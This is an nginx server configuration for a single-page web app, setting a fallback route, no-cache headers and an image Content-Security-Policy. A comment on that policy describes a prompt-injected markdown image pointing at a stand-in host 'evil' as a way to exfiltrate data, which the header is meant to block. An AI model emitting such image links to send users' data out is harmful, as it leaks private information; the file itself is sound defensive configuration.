server {
    listen 8080;
    root /usr/share/nginx/html;

    # SPA fallback. No `$uri/`: its directory redirect would point at the container port 8080.
    location / {
        try_files $uri /index.html;
    }

    # Must never be stale: index.html names the hashed bundles, config.json differs per environment.
    location = /index.html {
        add_header Cache-Control no-cache;
        # No images from other origins: a prompt-injected ![](https://evil/?q=…) can't exfiltrate.
        add_header Content-Security-Policy "img-src 'self' data:";
    }
    location = /config.json {
        add_header Cache-Control no-cache;
    }
}
